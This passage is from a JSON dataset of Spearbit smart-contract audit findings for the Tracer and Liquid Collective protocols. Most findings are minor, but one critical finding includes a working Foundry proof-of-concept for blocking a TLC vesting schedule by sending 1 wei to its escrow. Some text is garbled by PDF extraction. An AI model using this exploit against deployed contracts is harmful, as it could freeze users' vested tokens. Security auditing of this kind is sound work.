definitions in the same file. The constant one is lowercase, while usually constants are uppercase. contract PoolCommitter is IPoolCommitter, Initializable { bytes16 public constant one = 0x3fff0000000000000000000000000000; ... // Set max minting fee to 100%. This is a ABDKQuad representation of 1 * 10 ** 18 bytes16 public constant MAX_MINTING_FEE = 0x403abc16d674ec800000000000000000; } library PoolSwapLibrary { /// ABDKMathQuad-formatted representation of the number one bytes16 public constant one = 0x3fff0000000000000000000000000000; }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Lack of a state to allow withdrawal of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Immediately after the invariants dont hold and the pool has been paused, Governance can withdraw the collateral (quote). It might be prudent to create a separate state besides paused, such that unpause actions cant happen anymore to indicate withdrawal intention. Note: the comment in withdrawQuote() is incorrect. Pool must be paused. /** ... * @dev Pool must not be paused // comment not accurate ... */ ... function withdrawQuote() external onlyGov { require(paused, \"Pool is live\"); IERC20 quoteERC = IERC20(quoteToken); uint256 balance = quoteERC.balanceOf(address(this)); IERC20(quoteToken).safeTransfer(msg.sender, balance); emit QuoteWithdrawn(msg.sender, balance); }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Undocumented frontrunning protection", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "PoolFactory deployPool() per(deploymentParameters.oracleWrapper).deployer() == msg.sender frontrunning the deployment transaction of the pool. function the In of contract, check the protects IOracleWrap- against This is because the poolCommitter, LeveragedPool and the pair tokens instances are deployed at a deterministic address, calculated from the values of leverageAmount, quoteToken and oracleWrapper. An attacker cannot frontrun the pool deployment because of the different msg.sender address, that causes the deployer() check to fail. Alternatively, the attacker will have a different oracleWrapper, resulting in a different pool. However, this is not obvious to a casual reader. function deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) { ... require( IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \"Deployer must be oracle wrapper owner\" ); ... bytes32 uniquePoolHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper ) ); PoolCommitter poolCommitter = PoolCommitter( Clones.cloneDeterministic(poolCommitterBaseAddress, uniquePoolHash) ); ... LeveragedPool pool = LeveragedPool(Clones.cloneDeterministic(poolBaseAddress, uniquePoolHash)); ... } function deployPairToken(... ) internal returns (address) { ... bytes32 uniqueTokenHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper, direction ) ); PoolToken pairToken = PoolToken(Clones.cloneDeterministic(pairTokenBaseAddress, ,! uniqueTokenHash)); ... }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "No event exists for users self-claiming commits", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There is no event emitted when a user self-claims a previous commit for themselves, in contrast to claim() which does emit the PaidRequestExecution event.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Mixups of types and scaling factors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "There are a few findings that are related to mixups of types or scaling factors. The following types and scaling factors are used:  uint (no scaling)  uint (WAD scaling)  ABDKMathQuad  ABDKMathQuad (WAD scaling) Solidity >0.8.9s user defined value types could be used to prevent mistakes. This will require several typecasts, but they dont add extra gas costs.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Missing events for setInvariantCheck() and setAutoClaim() in PoolFactory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Events should be emitted for access-controlled critical functions, and functions that set protocol parameters or affect the protocol in significant ways.", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Terminology used for tokens and oracles is not clear and consistent across codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Different terms are used across the codebase to address the different tokens, leading to some mixups. Assuming a pair BTC/USDC is being tracked with WETH as collateral, we think the following definitions apply:  collateral token == quote token == settlement token == WETH  pool token == long token + short token == long BTC/USDC + short BTC/USDC As for the oracles:  settlementEthOracle is the oracle for settlement in ETH (WETH/ETH)  oracleWrapper is the oracle for BTC/USDC Here is an example of a mixup: The comments in getMint() and getBurn() are different while their result should be similar. It seems the comment on getBurn() has reversed settlement and pool tokens. * @notice Calculates the number of pool tokens to mint, given some settlement token amount and a ,! price ... * @return Quantity of pool tokens to mint ... function getMint(bytes16 price, uint256 amount) public pure returns (uint256) { ... } * @notice Calculate the number of settlement tokens to burn, based on a price and an amount of ,! pool tokens //settlement & pool seem reversed ... * @return Quantity of pool tokens to burn ... function getBurn(bytes16 price, uint256 amount) public pure returns (uint256) { ... } The settlementTokenPrice variable in keeperGas() is misleading and not clear whether it is Eth per Settlement or Settlement per Eth. contract PoolKeeper is IPoolKeeper, Ownable { function keeperGas(..) public view returns (uint256) { int256 settlementTokenPrice = ,! IOracleWrapper(ILeveragedPool(_pool).settlementEthOracle()).getPrice(); ... } }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Incorrect NatSpec and comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf", "body": "Some NatSpec documentation and comments contain incorrect or unclear information. In PoolSwapLibraryL283-L293, the NatSpec for the isBeforeFrontRunningInterval() function refers to uncom- mitment, which is not longer supported. * @notice Returns true if the given timestamp is BEFORE the frontRunningInterval starts, * function isBeforeFrontRunningInterval(...) which is allowed for uncommitment. In LeveragedPool.sol#L511 the NatSpec for the withdrawQuote() function notes that the pool should not be paused while the require checks that it is paused. * @dev Pool must not be paused function withdrawQuote() ... { require(paused, \"Pool is live\"); In LeveragedPool.sol#L47 the comment is unclear, as it references a singular update interval but the mapping points to arrays. // The most recent update interval in which a user committed mapping(address => uint256[]) public unAggregatedCommitments; In PoolToken.sol#L16-L23 both the order and the meaning of the documentation are wrong.  The @param lines order should be switched.  @param amount Pool tokens to burn should be replaced with @param amount Pool tokens to mint  @param account Account to burn pool tokens to should be replaced with @param account Account to mint pool tokens to /** * @notice Mints pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens to + * @param account Account to mint pool tokens to + * @param amount Pool tokens to mint */ function mint(address account, uint256 amount) external override onlyOwner { ... } In PoolToken.sol#L25-L32 the order of the @param lines is reversed. 47 /** * @notice Burns pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens from + * @param account Account to burn pool tokens from + * @param amount Pool tokens to burn */ function burn(address account, uint256 amount) external override onlyOwner { ... } In PoolFactory.sol#L176-L203 the NatSpec @param for poolOwner is missing. It would also be suggested to change the parameter name from poolOwner to pool, since the parameter received from deployPool is the address of the pool and not the owner of the pool. /** * @notice Deploy a contract for pool tokens + * @param pool The pool address, owner of the Pool Token * @param leverage Amount of leverage for pool * @param deploymentParameters Deployment parameters for parent function * @param direction Long or short token, L- or S- * @return Address of the pool token */ function deployPairToken( - + address poolOwner, address pool, string memory leverage, PoolDeployment memory deploymentParameters, string memory direction ) internal returns (address) { ... pairToken.initialize(poolOwner, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); pairToken.initialize(pool, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); ... - + } In PoolSwapLibrary.sol#L433-L454 the comments for two of the parameters of function getMintWithBurns() are reversed. * @param amount ... * @param oppositePrice ... ... function getMintWithBurns( ... bytes16 oppositePrice, uint256 amount, ... ) public pure returns (uint256) { ... In ERC20_Cloneable.sol#L46-L49 a comment at the constructor of contract ERC20_Cloneable mentions a default value of 18 for decimals. However, it doesnt use this default value, but the supplied parameter. Moreover, a comment at the constructor of ERC20_Cloneable contract mentions _setupDecimals. This is probably a reference to an old version of the OpenZeppelin ERC20 contracts, and no longer relevant. Additionally, the comments say the values are immutable, but they are set in the initialize() function. 48 @dev Sets the values for {name} and {symbol}, initializes {decimals} with * a default value of 18. * To select a different value for {decimals}, use {_setupDecimals}. * * construction. All three of these values are immutable: they can only be set once during ... constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) { _decimals = decimals_; } function initialize(address _pool, string memory name_, string memory symbol_, uint8 decimals_) ,! external initializer { owner = _pool; _name = name_; _symbol = symbol_; _decimals = decimals_; }", "labels": ["Spearbit", "Tracer", "Severity: Informational"]}, {"title": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unsolicited exits can happen at the end of _setStoppedValidatorCounts(...)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf", "body": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unso- licited exits can happen at the end of _setStoppedValidatorCounts(...) to avoid extra operations like taking minimum per iteration of the loops. Note that: an = an(cid:0)1 (cid:0) min(an(cid:0)1, bn) ) an = a0 (cid:0) min(a0, n X i=1 bn) = max(0, a0 (cid:0) n X i=1 bn)", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "use _setCurrentValidatorExitsDemand", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf", "body": "If an update is needed for CurrentValidatorExitsDemand in _setStoppedValidatorCounts(...), the internal function _setCurrentValidatorExitsDemand is not used.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "Changes to the emission of RequestedValidatorExits event during catch-up", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf", "body": "The event log will be different between the old and new implementations. In the old implementation, the latest RequestedValidatorExits event in the logs will always contain the most up-to-date count of requested exits (count) of an operator after a \"catch-up\" attempt. This is because a new RequestedValidatorExits event with the up-to-date currentStoppedCount is emitted at the end of the async requestValidatorExits function call. However, in the new implementation, the latest RequestedValidatorExits event in the logs contains the outdated or previous count of an operator after a \"catch-up\" attempt since a new RequestedValidatorExits event is not emitted at the end of the Oracle reporting transaction. If any off-chain component depends on the latest RequestedValidatorExits event in the logs to determine the count of requested exits (count), it might potentially cause the off-chain component to read and process outdated information. For instance, an operator's off-chain component might be reading the count within the latest Request- edValidatorExits event in the logs and comparing it against its internal counter to decide if more validators need to be exited. The following shows the discrepancy between the events emitted between the old and new implementations. Catch-up implementation in the previous design 1) Catch-up was carried out async when someone called the requestValidatorExits > _pickNextValida- torsToExitFromActiveOperators function 2) Within the _pickNextValidatorsToExitFromActiveOperators function. Assume an operator called opera It will attempt to \"catch-up\" by and its currentRequestedExits is less than the currentStoppedCount. performing the following actions: 1) Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2) Let x be the no. of validator count to \"catch-up\" (x = currentStoppedCount (cid:0) currentRequestedExits) 3) opera.picked will be incremented by x. Since opera.picked has not been initialized yet, opera.picked = x 3) Assume that the opera is neither the operator with the highest validation count nor the operator with the second highest. As such, opera is not \"picked\" to exit its validators 5 4) Near the end of the _pickNextValidatorsToExitFromActiveOperators function, it will loop through all op- erators that have operator .picked > 0 and perform some actions. The following actions will be performed against opera since opera.picked > 0: 1) Emit RequestedValidatorExits(opera, currentStoppedCount) event 2) Set opera.requestedExits = currentStoppedCount. 5) After the transaction, two events were emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount)  RequestedValidatorExits(opera, currentStoppedCount) Catch-up implementation in the new design 1. Catch-up was carried out within the _setStoppedValidatorCounts function during Oracle reporting. 2. Let _stoppedValidatorCounts[idx] be the currentStoppedCount AND operators.requestedExits be currentRequestedExits 3. Assume an operator called opera and its currentRequestedExits is less than the currentStoppedCount. It will attempt to \"catch-up\" by performing the following actions: 1. Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2. Set opera.requestedExits = currentStoppedCount. 4. After the transaction, only one event was emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) In addition, as per the comment below, it was understood that unsolicited exits are considered as if exit requests were performed for them. In this case, the latest RequestedValidatorExits event in the logs should reflect the most up-to-date count of exit requests for an operator including unsolicited exits at any time. File: OperatorsRegistry.1.sol 573: ,! 574: ,! were performed for them vars.currentValidatorExitsDemand); // we decrease the demand, considering unsollicited exits as if the exit requests vars.currentValidatorExitsDemand -= LibUint256.min(unsollicitedExits,", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "A malicious user could DOS a vesting schedule by sending only 1 wei of TLC to the vesting escrow address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "An external user who owns some TLC tokens could DOS the vesting schedule of any user by sending just 1 wei of TLC to the escrow address related to the vesting schedule. By doing that:  The creator of the vesting schedule will not be able to revoke the vesting schedule.  The beneficiary of the vesting schedule will not be able to release any vested tokens until the end of the vesting schedule.  Any external contracts or dApps will not be able to call computeVestingReleasableAmount . In practice, all the functions that internally call _computeVestingReleasableAmount will revert because of an un- derflow error when called before the vesting schedule ends. The underflow error leasableAmount will enter uint256 releasedAmount = _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) - balanceOf(_escrow); is thrown because, when called before the schedule ends, _computeVestingRe- try to compute the if (_time < _vestingSchedule.end) branch and will In this case, _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) will always be lower than balanceOf(_escrow) and the contract will revert with an underflow error. When the vesting period ends, the contract will not enter the if (_time < _vestingSchedule.end) and the user will be able to gain the whole vested amount plus the extra amount of TLC sent to the escrow account by the malicious user. Scenario: 1) Bob owns 1 TLC token. 2) Alluvial creates a vesting schedule for Alice like the following example: createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); 3) Bob sends 1 TLC token to the vesting schedule escrow account of the Alice vesting schedule. 8 4) After the cliff period, Alice should be able to release 1 TLC token. Because now balanceOf(_escrow) is 11 it will underflow as _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) returns 10. Find below a test case showing all three different DOS scenarios: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDOSReleaseVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice 9 vm.prank(bob); tlc.transfer(aliceEscrow, 1); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); // The transaction will revert for UNDERFLOW because now the balance of the escrow has been ,! increased externally vm.expectRevert(stdError.arithmeticError); tlc.releaseVestingSchedule(0); // Warp at the vesting schedule period end vm.warp(block.timestamp + 9 days); // Alice is able to get the whole vesting schedule amount // plus the token sent by the attacker to the escrow contract vm.prank(alice); tlc.releaseVestingSchedule(0); assertEq(tlc.balanceOf(alice), 11); } function testDOSRevokeVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); // The creator decide to revoke the vesting schedule before the end timestamp // It will throw an underflow error vm.prank(initAccount); vm.expectRevert(stdError.arithmeticError); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 1)); } function testDOSComputeVestingReleasableAmount() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice 10 vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); vm.expectRevert(stdError.arithmeticError); uint256 releasableAmount = tlc.computeVestingReleasableAmount(0); // Warp to the end of the vesting schedule vm.warp(block.timestamp + 10 days); releasableAmount = tlc.computeVestingReleasableAmount(0); assertEq(releasableAmount, 11); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } 11 }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Critical Risk"]}, {"title": "Coverage funds might be pulled not only for the purpose of covering slashing losses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The newly introduced coverage fund is a smart contract that holds ETH to cover a potential lsETH price decrease due to unexpected slashing events. Funds might be pulled from CoverageFundV1 to the River contract through setConsensusLayerData to cover the losses and keep the share price stable In practice, however, it is possible that these funds will be pulled not only in emergency events. _maxIncrease is used as a measure to enforce the maximum difference between prevTotalEth and postTotalEth, but in practice, it is being used as a mandatory growth factor in the context of coverage funds, which might cause the pulling of funds from the coverage fund to ensure _maxIncrease of revenue in case fees are not high enough.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Medium Risk"]}, {"title": "Consider preventing CoverageFundAddress to be set as address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of River.setCoverageFund and CoverageFundAddress.set both func- tion do not revert when the _newCoverageFund address parameter is equal to address(0). If the Coverage Fund address is empty, the River._pullCoverageFunds function will return earlier and will not pull any coverage fund.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Medium Risk"]}, {"title": "CoverageFund.initCoverageFundV1 might be front-runnable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Upgradeable contracts are used in the project, mostly relying on a TUPProxy contract. Initializing a contract is a 2 phase process where the first call is the actual deployment and the second call is a call to the init function itself. From our experience with the repository, the upgradeable contracts deployment scripts are using the TUPProxy correctly, however in that case we were not able to find the deployment script for CoverFund, so we decided to raise this point to make sure you are following the previous policy also for this contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Low Risk"]}, {"title": "Account owner of the minted TLC tokens must call delegate to own vote power of initial minted tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "ken.delegate(accountOwner) to auto-delegate to itself, otherwise it will have zero voting power. the minted TLC tokens must The _account owner of remember to call tlcTo- Without doing that anyone (even with just 1 voting power) could make any proposal pass and in the future manage the DAO proposing, rejecting or accepting/executing proposals. As the OpenZeppelin ERC20 documentation says: By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Low Risk"]}, {"title": "Consider using unchecked block to save some gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Because of the if statement, it is impossible for vestedAmount - releasedAmount to underflow, thus allowing the usage of the unchecked block to save a bit of gas.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Gas Optimization"]}, {"title": "createVestingSchedule allows the creation of a vesting schedule that could release zero tokens after a period has passed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Depending on the value of duration or amount it is possible to create a vesting schedule that would release zero token after a whole period has elapsed. This is an edge case scenario but would still be possible given that createVestingSchedule can be called by anyone and not only Alluvial. See the following test case for an example //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDistributeZeroPerPeriod() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, duration: 365 days, period: 1 days, amount: 100, beneficiary: alice, delegatee: address(0), 15 revocable: true }) ); // One whole period pass and alice check how many tokens she can release vm.warp(block.timestamp + 1 days); uint256 releasable = tlc.computeVestingReleasableAmount(0); assertEq(releasable, 0); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}]